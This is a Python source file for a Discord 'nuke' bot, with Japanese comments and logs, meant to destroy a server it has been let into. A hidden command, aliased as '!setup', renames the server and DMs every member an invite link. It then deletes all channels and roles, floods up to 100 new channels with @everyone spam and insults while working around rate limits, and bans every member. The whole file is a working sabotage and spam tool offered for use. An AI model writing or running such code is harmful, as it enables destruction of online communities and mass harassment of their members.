import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

guild_member_counts = {}

@bot.event
async def on_guild_join(guild):
    count = sum(1 for m in guild.members if not m.bot)
    guild_member_counts[guild.id] = count
    print(f"参加: {guild.name} ({count} non-bot members)")

sem_global = asyncio.Semaphore(40)
sem_message = asyncio.Semaphore(100)
sem_dm = asyncio.Semaphore(20)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member, content):
    try:
        await member.send(content)
    except:
        pass

async def create_channel_safely(guild, counter):
    try:
        ch = await guild.create_text_channel("ますまに共栄圏万歳")
        print(f"作成成功 [{counter}]")
        return ch
    except discord.HTTPException as e:
        if e.status == 429:
            retry = getattr(e, 'retry_after', 3)
            print(f"429検知！ {retry:.1f}秒待機して再試行")
            await asyncio.sleep(retry + 0.2)
            return await create_channel_safely(guild, counter)
        else:
            print(f"チャンネル作成エラー: {e}")
            return None
    except Exception as e:
        print(f"予期せぬエラー: {e}")
        return None

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME
    print(f"ますまに開始: {guild.name} → 新サーバー名: {new_name}")

    try:
        await guild.edit(name=new_name, reason="ますまに共栄圏")
        print(f"サーバー名変更成功: {new_name}")
    except discord.Forbidden:
        print("サーバー名変更権限なし → スキップ")
    except Exception as e:
        print(f"サーバー名変更失敗: {e}")

    member_count = guild_member_counts.get(guild.id, 0)
    if member_count == 0:
        member_count = sum(1 for m in guild.members if not m.bot and m != bot.user)
        guild_member_counts[guild.id] = member_count

    print(f"対象非bot人数: {member_count}人")

    if member_count < 100:
        dm_concurrency = 25
        target_channels = 100
        messages_per_channel_goal = 100
        channel_batch_size = 40
        channel_batch_sleep_base = 0.05
        spam_round_sleep_min = 0.05
        spam_round_sleep_max = 0.15
        print("小規模サーバー → 爆速鬼モード")
    elif member_count < 500:
        dm_concurrency = 15
        target_channels = 80
        messages_per_channel_goal = 100
        channel_batch_size = 35
        channel_batch_sleep_base = 0.1
        spam_round_sleep_min = 0.1
        spam_round_sleep_max = 0.25
        print("中規模サーバー → 超高速モード")
    else:
        dm_concurrency = 8
        target_channels = 60
        messages_per_channel_goal = 100
        channel_batch_size = 30
        channel_batch_sleep_base = 0.2
        spam_round_sleep_min = 0.2
        spam_round_sleep_max = 0.4
        print("大規模サーバー → 高速安定モード")

    global sem_dm
    sem_dm = asyncio.Semaphore(dm_concurrency)

    members = [m for m in guild.members if not m.bot and m != bot.user]

    dm_content = f"{new_name} {INVITE_LINK}"
    dm_tasks = [limited_dm(send_dm(m, dm_content)) for m in members]
    await asyncio.gather(*dm_tasks)
    print(f"DM完了: {len(members)}人")

    await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)
    await asyncio.gather(*[r.delete() for r in guild.roles if not r.is_default() and not r.managed], return_exceptions=True)

    channels = []
    current = 0
    print(f"チャンネル作成開始... 目標: {target_channels}")

    while len(channels) < target_channels:
        tasks = []
        for _ in range(channel_batch_size):
            if len(channels) >= target_channels:
                break
            current += 1
            tasks.append(create_channel_safely(guild, current))

        if not tasks:
            break

        created_batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = 0
        for res in created_batch:
            if isinstance(res, discord.TextChannel):
                channels.append(res)
                added += 1

        print(f"バッチ完了: +{added}個 (合計 {len(channels)}/{target_channels})")

        await asyncio.sleep(random.uniform(channel_batch_sleep_base, channel_batch_sleep_base + 0.1))

        if added == 0:
            print("連続失敗 → 作成中断")
            break

    print(f"チャンネル作成完了: {len(channels)}個")

    if not channels:
        print("チャンネルゼロ → BANのみ実行")
        ban_tasks = [limited_global(guild.ban(m, reason=new_name, delete_message_days=0)) for m in members]
        await asyncio.gather(*ban_tasks, return_exceptions=True)
        print("BAN完了")
        return

    spam_messages = [
        f"@everyone {new_name} 万歳！！！ {INVITE_LINK}",
        f"@everyone ますまに共栄圏最強 {INVITE_LINK}",
        f"@everyone 雑魚乙ゴミサーバー {INVITE_LINK}",
        f"@everyone 来いよ {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    print(f"高速同時ラウンドロビンスパム開始... 各チャンネル {messages_per_channel_goal}メッセージまで")

    while any(count < messages_per_channel_goal for count in message_counters.values()):
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= messages_per_channel_goal:
                active_channels.remove(ch)
                continue

            async def send_one(ch=ch):
                try:
                    msg = random.choice(spam_messages)
                    await limited_message(ch.send(msg))
                    message_counters[ch.id] += 1
                    print(f"[{ch.name}] 送信 {message_counters[ch.id]}/{messages_per_channel_goal}")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry = getattr(e, 'retry_after', 2) + 0.3
                        print(f"[{ch.name}] 429待機 {retry:.2f}s")
                        await asyncio.sleep(retry)
                        # 待機後すぐ再挑戦
                        spam_tasks.append(send_one(ch))
                    else:
                        print(f"[{ch.name}] エラー {e} → 除外")
                        if ch in active_channels:
                            active_channels.remove(ch)
                except:
                    print(f"[{ch.name}] 予期せぬエラー → 除外")
                    if ch in active_channels:
                        active_channels.remove(ch)

            spam_tasks.append(send_one())

        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)

        await asyncio.sleep(random.uniform(spam_round_sleep_min, spam_round_sleep_max))

    print("全チャンネル100メッセージ達成 → スパム完了")

    ban_tasks = []
    for m in members:
        async def do_ban():
            try:
                await guild.ban(m, reason=f"{new_name}", delete_message_days=0)
                print(f"BAN成功: {m}")
            except:
                pass
        ban_tasks.append(limited_global(do_ban()))

    await asyncio.gather(*ban_tasks, return_exceptions=True)

    print("ますまに全工程完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild:
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"ボット起動: {bot.user} (ID: {bot.user.id})")
    print("コマンド: !masumani [名前] または !setup [名前] で発動")

bot.run(TOKEN)
